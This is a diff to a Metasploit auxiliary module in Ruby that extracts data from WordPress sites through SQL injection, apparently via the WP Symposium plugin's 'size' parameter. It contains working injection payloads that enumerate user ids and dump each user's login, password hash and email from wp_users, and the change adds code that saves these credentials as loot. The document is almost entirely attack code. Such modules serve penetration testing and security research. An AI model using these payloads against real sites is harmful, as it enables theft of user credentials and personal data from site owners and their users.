@@ -46,12 +46,13 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def send_sql_request(sql_query)
-    uri_complete = normalize_uri(uri_plugin, sql_query)
+    uri_complete = normalize_uri(uri_plugin)
 
     begin
       res = send_request_cgi(
-        'method' => 'GET',
-        'uri'    => uri_complete,
+        'method'   => 'GET',
+        'uri'      => uri_complete,
+        'vars_get' => { 'size' => sql_query }
       )
 
       return nil if res.nil? || res.code != 200 || res.body.nil?
@@ -66,7 +67,8 @@ class MetasploitModule < Msf::Auxiliary
 
   def run
     vprint_status("#{peer} - Attempting to connect...")
-    first_id = send_sql_request("?size=id%20from%20wp_users%20order%20by%20id%20asc%20limit%201%20;%20--")
+    vprint_status("#{peer} - Trying to retrieve the first user id...")
+    first_id = send_sql_request('id from wp_users order by id asc limit 1 ; --')
     if first_id.nil?
       vprint_error("#{peer} - Failed to retrieve the first user id... Try with check function!")
       return
@@ -75,7 +77,7 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     vprint_status("#{peer} - Trying to retrieve the last user id...")
-    last_id = send_sql_request("?size=id%20from%20wp_users%20order%20by%20id%20desc%20limit%201%20;%20--")
+    last_id = send_sql_request('id from wp_users order by id desc limit 1 ; --')
     if last_id.nil?
       vprint_error("#{peer} - Failed to retrieve the last user id")
       return
@@ -86,14 +88,22 @@ class MetasploitModule < Msf::Auxiliary
     vprint_status("#{peer} - Trying to retrieve the users informations...")
     for user_id in first_id..last_id
       separator = Rex::Text.rand_text_numeric(7,bad='0')
-      user_info = send_sql_request("?size=concat_ws(#{separator},user_login,user_pass,user_email)%20from%20wp_users%20where%20id%20=%20#{user_id}%20;%20--")
+      user_info = send_sql_request("concat_ws(#{separator},user_login,user_pass,user_email) from wp_users where id = #{user_id} ; --")
 
       if user_info.nil?
         vprint_error("#{peer} - Failed to retrieve the users info")
         return
       else
         values = user_info.split("#{separator}")
-        print_good("#{peer} - #{sprintf("%-15s %-34s %s", values[0], values[1], values[2])}")
+
+        user_login = values[0]
+        user_pass  = values[1]
+        user_email = values[2]
+
+        print_good("#{peer} - #{sprintf("%-15s %-34s %s", user_login, user_pass, user_email)}")
+
+        loot = store_loot("wp_symposium.http","text/plain", rhost, "#{user_login},#{user_pass},#{user_email}")
+        vprint_status("Credentials saved in: #{loot}")
       end
     end
   end
